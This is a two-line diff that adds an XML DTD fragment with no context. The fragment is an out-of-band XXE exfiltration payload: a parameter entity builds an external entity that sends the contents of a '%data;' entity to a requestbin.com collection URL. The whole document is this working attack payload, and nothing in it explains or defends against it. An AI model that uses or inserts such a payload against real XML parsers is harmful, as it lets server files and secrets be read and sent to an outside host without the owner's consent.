@@ -1,0 +1,2 @@
+<!ENTITY % eval "<!ENTITY exfil SYSTEM 'https://requestbin.com/r/eni1yo3nezocd/?%data;'>">
+%eval;
